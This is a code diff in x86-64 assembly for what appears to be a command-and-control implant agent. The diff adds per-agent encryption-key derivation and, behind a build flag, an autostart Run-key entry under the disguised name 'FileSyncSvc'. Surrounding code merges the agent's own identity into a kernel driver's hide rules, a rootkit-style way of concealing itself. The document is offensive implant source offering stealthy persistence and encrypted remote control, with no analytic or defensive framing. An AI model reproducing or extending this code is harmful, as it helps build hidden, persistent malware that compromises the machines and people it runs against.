@@ -160,7 +160,9 @@ agent_id:
 ; --- Target server address ---
 server_ip_str:
     db "127.0.0.1", 0
+%ifndef server_port
 server_port             equ 4433
+%endif
 
 ; --- Heartbeat interval (ms) ---
 heartbeat_interval_ms   dd 30000
@@ -326,6 +328,9 @@ global _start
 %ifndef TEST_BUILD
 _start:
     sub rsp, 40                     ; Shadow space + alignment
+
+    ; per-agent session key before anything is sealed
+    call derive_agent_psk
 
     call resolve_ws2_functions
     test eax, eax
@@ -2623,6 +2628,38 @@ recv_command:
     ret
 
 ; ===========================================================================
+; derive_agent_psk: replace the embedded master PSK with the per-agent
+; session key = first 32 bytes of ChaCha20(master, nonce = le32(0x50534B31)
+; || agent_id, counter 0). Byte-for-byte identical to the gateway's
+; protocol.DeriveAgentPSK, so the master key never encrypts traffic.
+; ===========================================================================
+derive_agent_psk:
+    sub rsp, 40
+
+    mov dword [cc_nonce], 0x50534B31
+    mov rax, [agent_id]
+    mov [cc_nonce + 4], rax
+
+    xor ecx, ecx                ; block counter 0
+    call chacha_init_state
+    call chacha20_block         ; keystream now in cc_state
+
+    ; psk[0..31] = cc_state[0..31]
+    lea rsi, [cc_state]
+    lea rdi, [psk]
+    mov ecx, 8
+.dp_loop:
+    mov eax, [rsi]
+    mov [rdi], eax
+    add rsi, 4
+    add rdi, 4
+    dec ecx
+    jnz .dp_loop
+
+    add rsp, 40
+    ret
+
+; ===========================================================================
 ; send_startup_protect: merge this agent's own identity into the kernel
 ; driver's hide rules through sandbox command 0x08 (registry Config merge).
 ; Payload: image-name \0 agent-dir \0 gateway-ip \0 "sandbox.exe" \0
@@ -2677,6 +2714,22 @@ send_startup_protect:
 .sp_w2a_done:
     mov byte [rdi], 0
     mov r13, rdi                    ; ascii end (exclusive)
+
+%ifdef FEI_PERSIST
+    ; keep a full-path copy (offset +0x1000) before the backslash split
+    ; writes a NUL over the separator; the persist frame needs the path.
+    lea rsi, [pipe_buffer]
+    lea rdi, [pipe_buffer + 0x1000]
+    mov rcx, r13
+    sub rcx, rsi
+.sp_savepath:
+    mov al, [rsi]
+    mov [rdi], al
+    inc rsi
+    inc rdi
+    loop .sp_savepath
+    mov byte [rdi], 0
+%endif
 
     ; ---- split at the last '\' : dir | name ----
     lea rbx, [pipe_buffer]          ; ascii start
@@ -2767,6 +2820,52 @@ send_startup_protect:
     lea rcx, [pipe_buffer]
     mov edx, eax
     call sandbox_recv_exact         ; discard
+
+%ifdef FEI_PERSIST
+    ; ---- autostart: HKLM Run value pointing at this binary ----
+    lea rdi, [recv_plaintext_buf + 5]
+    lea rsi, [persist_value_name]
+.sp_pv1:
+    mov al, [rsi]
+    mov [rdi], al
+    inc rsi
+    inc rdi
+    test al, al
+    jnz .sp_pv1
+    lea rsi, [pipe_buffer + 0x1000]
+.sp_pv2:
+    mov al, [rsi]
+    mov [rdi], al
+    inc rsi
+    inc rdi
+    test al, al
+    jnz .sp_pv2
+
+    lea rax, [recv_plaintext_buf + 5]
+    mov rdx, rdi
+    sub rdx, rax                    ; payload length
+    mov byte [recv_plaintext_buf], 0x0A
+    mov dword [recv_plaintext_buf + 1], edx
+    add rdx, 5
+    lea rcx, [recv_plaintext_buf]
+    call sandbox_send
+    test eax, eax
+    jz .sp_done
+
+    lea rcx, [recv_plaintext_buf]
+    mov edx, 4
+    call sandbox_recv_exact
+    test eax, eax
+    jz .sp_done
+    mov eax, [recv_plaintext_buf]
+    test eax, eax
+    jz .sp_done
+    cmp eax, MAX_AGENT_PAYLOAD
+    ja .sp_done
+    lea rcx, [pipe_buffer]
+    mov edx, eax
+    call sandbox_recv_exact         ; discard
+%endif
 
 .sp_done:
     add rsp, 48
@@ -2991,6 +3090,7 @@ process_command:
 section .data
 
 ; --- Sandbox executable path (wide string) ---
+persist_value_name: db "FileSyncSvc", 0
 sandbox_exe_name_a: db "sandbox.exe", 0
 sandbox_exe_path:
     dw 's','a','n','d','b','o','x','.','e','x','e',0
